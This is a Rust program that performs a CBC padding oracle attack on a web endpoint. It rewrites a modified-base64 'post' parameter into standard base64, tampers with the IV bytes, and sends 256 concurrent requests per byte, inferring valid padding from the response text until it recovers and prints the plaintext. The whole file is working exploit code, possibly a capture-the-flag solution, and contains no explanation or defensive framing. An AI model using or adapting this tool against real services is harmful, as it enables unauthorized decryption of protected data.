use futures::stream;
use futures::StreamExt;
use reqwest::Client;
use std::time::Duration;
use base64::{encode, decode};
use std::env;

mod error;
use error::Error;

const BLOCK_SIZE: usize = 16;

fn main() {
    let args: Vec<String> = env::args().collect();
    let endpoint = &args[1];
    let ciphertext = &args[2];

    let post_id = ciphertext
        .clone()
        .replace('~', "=")
        .replace('!', "/")
        .replace('-', "+");

    let ciphertext = decode(&post_id).expect("Failed to decode post id");
    let blocks = ciphertext.len() / BLOCK_SIZE;
    let mut plaintext = Vec::new();
    let http_timeout = Duration::from_secs(10);
    let http_client = Client::builder().timeout(http_timeout).build().expect("Building HTTP client");

    for block_index in 1..blocks {
        let current_iv = &ciphertext[((block_index - 1) * BLOCK_SIZE)..(block_index * BLOCK_SIZE)];
        let current_block = &ciphertext[(block_index * BLOCK_SIZE)..((block_index + 1) * BLOCK_SIZE)];
        let mut decrypted = [0_u8; BLOCK_SIZE];

        (0..BLOCK_SIZE).for_each(|known_bytes|  {
            let mut buffer = [200_u8; BLOCK_SIZE];
            let padding_value = known_bytes + 1;

            for padding_index in 0..known_bytes {
                let byte_position = BLOCK_SIZE - padding_index - 1;
                buffer[byte_position] = decrypted[byte_position] ^ current_iv[byte_position] ^ padding_value as u8 ;
            }

            if let Some(byte) = find_candidate(&http_client, endpoint, &mut buffer, current_block, BLOCK_SIZE - padding_value) {
                let decrypted_byte = current_iv[BLOCK_SIZE - padding_value] ^ byte ^ padding_value as u8;
                println!("{}", decrypted_byte as char);
                decrypted[BLOCK_SIZE - padding_value] = decrypted_byte;
            } else {
                panic!("Failed to find candidate");
            }
        });

        decrypted.iter().for_each(|byte| plaintext.push(*byte));
        print!("{}", plaintext.iter().map(|b| *b as char).collect::<String>());
    }
}

fn encode_base64(bytes: &[u8]) -> String {
    encode(bytes)
        .replace('=', "~")
        .replace('/', "!")
        .replace('+',"-")
}

pub async fn test_candidate(http_client: &Client, endpoint: &str, byte: u8) -> Result<Option<u8>, Error> {
    let res = http_client.get(endpoint).send().await?;

    if !res.status().is_success() {
        println!("Failed to make HTTP call");
        return Ok(None);
    }

    let body = res.text().await?;

    if body.contains("Padding") || body.contains("padding") {
        return Ok(None)
    }

    Ok(Some(byte))
}

pub fn find_candidate(http_client: &Client, endpoint: &str, iv: &mut [u8], block: &[u8], position: usize) -> Option<u8> {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("Building tokio's runtime");

    runtime.block_on(async move {
        let requests_concurrency = 32;

        stream::iter(0..=255_u8)
            .map(|byte| {
                iv[position] = byte;

                let http_client = http_client.clone();
                let candidate = [iv, block].concat();
                let endpoint = format!("{}/?post={}", endpoint, encode_base64(&candidate));

                async move {
                    match test_candidate(&http_client, &endpoint, byte).await {
                        Ok(Some(valid_byte)) => {
                            Some(valid_byte)
                        },
                        Ok(None) => None,
                        Err(err) => {
                            println!("Error: {}", err);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(requests_concurrency)
            .filter_map(|candidate| async move { candidate })
            .take(1)
            .collect::<Vec<_>>()
            .await
            .first()
            .copied()
    })
}
